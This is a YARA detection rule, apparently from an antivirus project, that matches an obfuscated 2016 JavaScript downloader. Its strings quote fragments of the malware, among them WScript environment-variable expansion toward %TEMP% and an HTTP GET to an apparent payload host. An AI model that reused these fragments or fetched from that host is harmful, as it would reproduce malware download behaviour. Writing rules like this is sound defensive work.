rule sig_20160428_891d441e83e39b0ec509a2282e021f10 {
  meta:
    description = "datamaliciousorder - file 20160428_891d441e83e39b0ec509a2282e021f10.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fbc503f66942fe0ef792692509f74f492357de6f8a6fe2c94fdd3e3d78cab83a"

  strings:
    $s1  = "function CkuUizHbtPejWsmYmxNvr(EiwQmhJzyCwiZavUljAil){JqaVhnRfsZpwArcRrlVjc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function CkuUizHbtPejWsmYmxNvr(EiwQmhJzyCwiZavUljAil){JqaVhnRfsZpwArcRrlVjc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function GklEtjItfWyqFbyCfaOwm() {return JqaVhnRfsZpwArcRrlVjc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function GygWdyQeaCxpJaoBspWgj(WucKibPbdAjeClbZmdZyo, XifPcvLswJfdRrpKsxUzx){PcuWfjJxgPcnWynYeeLvb = PcuWfjJxgPcnWynYeeLvb * 1; " ascii
    $s5  = "return WucKibPbdAjeClbZmdZyo - XifPcvLswJfdRrpKsxUzx;};" fullword ascii
    $s6  = "var JqaVhnRfsZpwArcRrlVjc = function CihFqpBiaIwgWrgHlrCbk() {return ZfrKyeCluLqhCnaEhwAwf[MnbDekNiiCpwJakSctHpq](\"WScript\"+\"" ascii
    $s7  = "JjoYceCxpYfaYpkEjqOuk[LaoJvrAudXrbNsgFghItx](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var ZfrKyeCluLqhCnaEhwAwf = this[\"WScript\"];" fullword ascii
    $s9  = "var JqaVhnRfsZpwArcRrlVjc = function CihFqpBiaIwgWrgHlrCbk() {return ZfrKyeCluLqhCnaEhwAwf[MnbDekNiiCpwJakSctHpq](\"WScript\"+\"" ascii
    $s10 = "function GklEtjItfWyqFbyCfaOwm() {return JqaVhnRfsZpwArcRrlVjc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function GygWdyQeaCxpJaoBspWgj(WucKibPbdAjeClbZmdZyo, XifPcvLswJfdRrpKsxUzx){PcuWfjJxgPcnWynYeeLvb = PcuWfjJxgPcnWynYeeLvb * 1; " ascii
    $s12 = "function KpzGdzRjoPsaXznTvyYyq(){return OfbFujYpbTslAweKlvWee + \"\";};" fullword ascii
    $s13 = "if (JjoYceCxpYfaYpkEjqOuk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function QfoLhhFulVdzEpdCmlGyu() {return ((EcpCpzBloRnxGgoFzqHne == true) && (EcpCpzBloRnxGgoFzqHne == RcwSxnSjoMdjGonMsjVmt)) ?" ascii
    $s15 = "function QfoLhhFulVdzEpdCmlGyu() {return ((EcpCpzBloRnxGgoFzqHne == true) && (EcpCpzBloRnxGgoFzqHne == RcwSxnSjoMdjGonMsjVmt)) ?" ascii
    $s16 = "var EcpCpzBloRnxGgoFzqHne = false;" fullword ascii
    $s17 = "}while (KzfBhiLbpMwuJelDleUko);" fullword ascii
    $s18 = "DmwBuyGveByhQriSliBkl = true;" fullword ascii
    $s19 = "function DrsFggNtuTkeWupWllZlt(RgbIiqSkaMyrAgjHhoZsf) {var HrqCbeFsrHhhJmpEjiCfb = (1, 2, 3, 4, 5, RgbIiqSkaMyrAgjHhoZsf); retur" ascii
    $s20 = "EcpCpzBloRnxGgoFzqHne = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}